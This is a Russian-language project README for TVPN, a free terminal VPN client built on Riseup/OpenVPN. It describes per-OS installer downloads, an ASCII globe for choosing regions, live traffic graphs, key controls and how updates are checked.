```text
  TTTTT V   V PPPP  N   N
    T   V   V P   P NN  N
    T   V   V PPPP  N N N
    T    V V  P     N  NN
    T     V   P     N   N

  FREE VPN / ASCII GLOBE / LINUX + macOS + WINDOWS
                                            by user9x21imi
```

**TVPN** — бесплатный VPN в терминале с интерактивным ASCII-глобусом,
выбором регионов и живыми графиками трафика. Работает через серверы Riseup,
без регистрации и аккаунта провайдера.

[Последний релиз](https://github.com/user9x21imi/tvpn/releases/latest) ·
[Проверки Linux / macOS / Windows](https://github.com/user9x21imi/tvpn/actions) ·
[Подробная документация](docs/technical.md)

```text
+------------------------- INSTALL TVPN -------------------------+
|  Choose your OS -> Download ZIP -> Extract -> Open installer   |
+---------------------------------------------------------------+
```

| Система | Скачать установщик | Что открыть |
|---|---|---|
| **Linux x86_64** | **[INSTALL LINUX](https://github.com/user9x21imi/tvpn/raw/refs/heads/main/assets/TVPN-Linux-Installer.zip)** | `Install-TVPN.desktop` → разрешить запуск, если спросит оболочка |
| **macOS 13+ · Intel / Apple Silicon** | **[INSTALL macOS](https://github.com/user9x21imi/tvpn/raw/refs/heads/main/assets/TVPN-macOS-Installer.zip)** | `Install-TVPN.command` двойным щелчком |
| **Windows 10/11** | **[INSTALL WINDOWS](https://github.com/user9x21imi/tvpn/raw/refs/heads/main/assets/TVPN-Windows-Installer.zip)** | `Install-TVPN-Windows.cmd` двойным щелчком |

Один установщик для каждой системы: он скачивает проект и создаёт ярлык.
При первой настройке сети система запрашивает права администратора.
Дальнейшие подключения не требуют пароля. Запуск из терминала — **`tvpn`**.
Перед повторной установкой остановите VPN и закройте панель.

- **Linux:** нужны `bash`, `curl`, `unzip`, Python 3, `sudo` и `visudo`.
  Если файловый менеджер не запускает `.desktop`, откройте терминал в
  распакованной папке и выполните `bash Install-TVPN-Linux.sh`.
  Установщик создаёт приложение TVPN и alias для bash/zsh; откройте новый терминал.
- **macOS:** установщик автоматически ставит недостающие Python и Tunnelblick.
  Если Gatekeeper блокирует `.command`, разрешите открытие через штатные
  настройки macOS. Ярлык: `~/Applications/TVPN.command`.
- **Windows:** нужен [App Installer / WinGet](https://learn.microsoft.com/windows/package-manager/winget/).
  Python и OpenVPN Community устанавливаются автоматически. Подтвердите UAC;
  после первой установки **выйдите из учётной записи и войдите снова**, чтобы
  применились права OpenVPN. Затем запускайте TVPN из «Пуск» или командой `tvpn`.

```text
+------------------------ INTERACTIVE GLOBE ---------------------+
|  Select region -> Smooth rotation -> Highlight country         |
|  Yellow: selected location    Green: verified VPN exit          |
+---------------------------------------------------------------+
```

![TVPN — интерактивный ASCII-глобус и показатели туннеля](assets/map-preview.png)

При выборе региона глобус плавно поворачивается к городу шлюза.
Страна выделяется цветными точками, город отмечается `@`.
Жёлтый цвет означает выбранную локацию; зелёный появляется после
HTTPS-проверки страны выхода через туннель. Соседние страны не подсвечиваются.

Глобус можно вращать вручную, приближать и запускать непрерывное вращение.
Управление камерой не переключает сервер. Встроенный Python-рендерер
вдохновлён [globe-cli](https://github.com/adam-wier/globe) и использует
геометрию Natural Earth; устанавливать Rust или globe-cli не нужно.

```text
+---------------------------- KEYS ------------------------------+
|  R          Region menu       L          Recent logs           |
|  Arrows     Rotate camera     + / -      Zoom                  |
|  Space      Spin / pause      F          Focus VPN location    |
|  Wheel      Zoom globe        U          ASCII / Unicode       |
|  Ctrl+S     Stop / reconnect  Ctrl+Q     Stop VPN and exit    |
+---------------------------------------------------------------+
```

```text
+----------------------------- STOPED ---------------------------+
|  Ctrl+S -> Stop tunnel -> Restore network -> Keep panel open    |
|  Ctrl+S again -> Reconnect selected region                     |
+---------------------------------------------------------------+
```

![TVPN — большая точечная надпись STOPED после остановки](assets/stoped-preview.png)

Ctrl+C также останавливает подключение, оставляя панель открытой.
В диагностическом текстовом режиме Ctrl+C завершает скрипт.

```text
+------------------------- LIVE SESSION -------------------------+
|  Status / External IP / Gateway / Verified country / Uptime     |
|  Download + Upload / MiB per second / Totals / 60-second graphs |
+---------------------------------------------------------------+
```

Панель показывает получение сертификата, подключение, проверку выхода,
переход на резервный шлюз, ошибки и отключение. Журнал открывается клавишей
`L`; приватные ключи и PEM-блоки фильтруются.

Скорость считается по разнице счётчиков интерфейса за фактически прошедшее
время, примерно раз в секунду. После переподключения начинается новый замер.
Это трафик текущего туннеля: МиБ/с, общий объём в МиБ/ГиБ и два графика за минуту.

```text
+-------------------------- FREE REGIONS ------------------------+
|  NL Amsterdam   FR Paris   CA Montreal                         |
|  US New York    US Miami   US Seattle                          |
+---------------------------------------------------------------+
```

Доступность определяется живым каталогом Riseup. Если для города нет шлюзов,
панель сообщает об этом и не подключается к другому городу молча.
Город шлюза берётся из конфигурации; страна выхода проверяется через HTTPS
по Cloudflare и независимому GeoIP-ответу. GeoIP-город показан отдельно:
он может отличаться от имени локации провайдера.

```text
+------------------------- UPDATE AVAILABLE ---------------------+
|  New version -> [Y] Yes / [N] No                               |
|  Yes: stop -> restore network -> verify SHA256 -> install       |
|  No: keep current version and tunnel                          |
+---------------------------------------------------------------+
```

Обновления проверяются в фоне при запуске и затем раз в час. После `Yes`
панель проверяет архив и версию, обновляется и перезапускается с выбранным
регионом. Настройки и Python-окружение сохраняются. Изменение защищённого
сетевого backend может потребовать разрешения администратора.

```text
+---------------------------- PROJECT ---------------------------+
|  TVPN interface: MIT          Geography: Natural Earth         |
|  VPN transport: Riseup / OpenVPN                               |
+---------------------------------------------------------------+
```

Проверки прошли в GitHub Actions на Linux, macOS и Windows. Они проверяют
глобус, регионы, счётчики, обновления и обработку завершения; CI не поднимает
реальный VPN-туннель. Нативные сетевые порты macOS/Windows требуют проверки
на реальном устройстве. Независимый проект, не официальный клиент Riseup;
автоматического kill switch при аварии приложения нет.

[Технические инструкции и диагностика](docs/technical.md) ·
[Устройство панели](README-panel.md) · [Лицензии и источники](SOURCES.md) ·
[История выпусков](https://github.com/user9x21imi/tvpn/releases)

`Ctrl+Q` — выход из клиента из любого экрана: сначала VPN штатно
останавливается и восстанавливает DNS/маршруты, затем панель закрывается.
